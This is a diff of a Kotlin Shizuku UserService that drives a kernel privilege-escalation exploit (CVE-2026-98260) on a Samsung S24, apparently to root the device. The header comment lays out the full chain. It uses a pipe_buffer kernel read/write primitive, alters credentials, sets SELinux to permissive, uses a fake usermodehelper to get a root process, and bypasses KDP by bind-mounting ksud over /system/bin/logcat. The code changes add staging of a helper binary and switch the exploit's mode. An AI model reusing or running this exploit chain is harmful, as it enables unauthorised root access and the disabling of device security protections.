@@ -10,22 +10,23 @@ import java.util.concurrent.atomic.AtomicBoolean
  * Shizuku UserService: runs the CVE-2026-98260 timer exploit as the shell user.
  *
  * Chain (all verified on the target S24 / 6.1.162-android14-11):
- *  1. stage ksud from the APK (jniLibs/libksud.so) to /data/local/tmp/w/ksud
+ *  1. stage ksud from the APK (jniLibs/libksud.so) to /data/local/tmp/samtimer/ksud
  *  2. raise the tracefs buffer (the leak needs headroom)
- *  3. run libtimer.so in "fake" mode: leak -> DEFEX creds_hash clear -> fake
+ *  3. run libtimer.so in "umhpipe" mode: pipe_buffer kernel r/w primitive ->
  *     cred -> SELinux permissive -> uid=0 child -> bind-mount ksud over
  *     /system/bin/logcat (KDP bypass) -> ksud late-load -> KSU_LOADED
- *  4. the exploit drains its spray pools; if failed-plant zombies are held
- *     it parks (alive, idle, detached) as their holder until reboot -- its
- *     death would let init reap them and corrupt kernel memory. KSU keeps
- *     root either way.
+ *  4. failed-plant zombies are made reap-safe (their posix-cpu-timer queue
+ *     leftmost pointers are zeroed through the write primitive) and reaped
+ *     immediately, so the exploit exits cleanly with no zombie left and
+ *     nothing for init to reap later. Parking is only a last-resort fallback
+ *     when a repair plant cannot land. KSU keeps root either way.
  */
 class RootService(private val context: Context) : IRootService.Stub() {
 
     private val running = AtomicBoolean(false)
 
     companion object {
-        private const val WORK_DIR = "/data/local/tmp/w"
+        private const val WORK_DIR = "/data/local/tmp/samtimer"
         // The exploit hardcodes the bind-mount source to WORK_DIR/ksud, and
         // the Samsung-patched ksud late-load expects a staged copy at
         // /data/local/tmp/.ksud-stage (it renames that file onto the same
@@ -93,7 +94,7 @@ class RootService(private val context: Context) : IRootService.Stub() {
             return 1
         }
 
-        // 1. workdir + ksud staging (the exploit hardcodes /data/local/tmp/w/ksud)
+        // 1. workdir + ksud staging (the exploit hardcodes /data/local/tmp/samtimer/ksud)
         val workDir = File(WORK_DIR)
         if (!(workDir.isDirectory || workDir.mkdirs())) {
             log(callback, "error: cannot create $WORK_DIR")
@@ -119,6 +120,19 @@ class RootService(private val context: Context) : IRootService.Stub() {
             log(callback, "warn: ksud staging failed (${e.message}); KSU load will fail")
         }
 
+        // 1b. UMH helper: the same payload binary under the path the fake
+        // usermodehelper execs (ROOT_UMH_PATH); --umh runs setksu_main.
+        try {
+            val uhexec = File(workDir, "uhexec")
+            timerBin.copyTo(uhexec, overwrite = true)
+            if (!uhexec.setExecutable(true, false)) {
+                log(callback, "warn: chmod +x uhexec failed")
+            }
+            log(callback, "staged uhexec (${uhexec.length()} bytes)")
+        } catch (e: IOException) {
+            log(callback, "warn: uhexec staging failed (${e.message}); KSU load will fail")
+        }
+
         // 2. tracefs buffer headroom (root-only write as shell is allowed here)
         runCatching {
             File(TRACE_BUF).writeText("8192\n")
@@ -127,9 +141,10 @@ class RootService(private val context: Context) : IRootService.Stub() {
             log(callback, "warn: trace buffer write failed (${it.message})")
         }
 
-        // 3. run the exploit
-        log(callback, "starting exploit (fake mode)...")
-        val proc = ProcessBuilder(timerBin.absolutePath, "fake")
+        // 3. run the exploit (umhpipe: pipe r/w primitive -> fake workqueue
+        // item -> kernel-issued root usermodehelper -> ksud late-load)
+        log(callback, "starting exploit (umhpipe mode)...")
+        val proc = ProcessBuilder(timerBin.absolutePath, "umhpipe")
             .directory(workDir)
             .redirectErrorStream(true)
             .start()
